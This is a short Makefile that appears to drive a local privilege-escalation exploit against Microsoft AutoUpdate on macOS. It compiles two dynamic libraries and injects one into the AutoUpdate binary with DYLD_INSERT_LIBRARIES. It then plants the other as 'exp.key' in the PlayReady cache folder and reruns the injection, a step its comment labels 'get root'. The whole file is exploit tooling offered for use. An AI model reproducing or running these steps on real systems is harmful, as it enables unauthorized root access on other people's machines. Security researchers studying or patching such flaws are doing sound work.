OUTPUT="./bin"

XPC=$(OUTPUT)/xpc.dylib
ROOT=$(OUTPUT)/root.dylib

.PHONY: bin/xpc.dylib bin/root.dylib

dylib: xpc root

download:
	./getpkg.sh

xpc: xpc.mm
	$(CC) $(CFLAGS) $(C_INCLUDES) -framework Foundation \
		-dynamiclib xpc.mm \
		-o $(XPC)

root: root.mm
	$(CC) $(CFLAGS) -m32 $(C_INCLUDES) -framework Foundation \
		-dynamiclib root.mm \
		-o $(ROOT)

run: dylib
	# first round, create required directory and change its permission:
	# /Library/Application Support/Microsoft/PlayReady/

	DYLD_INSERT_LIBRARIES="$(XPC)" \
		"/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate"

	mkdir -p "/Library/Application Support/Microsoft/PlayReady/mspr.hds"
	mkdir -p "/Library/Application Support/Microsoft/PlayReady/Cache/"
	cp $(ROOT) "/Library/Application Support/Microsoft/PlayReady/Cache/exp.key"

	# round two, get root
	DYLD_INSERT_LIBRARIES="$(XPC)" \
		"/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate"

clean:
	rm -rf $(OUTPUT)/*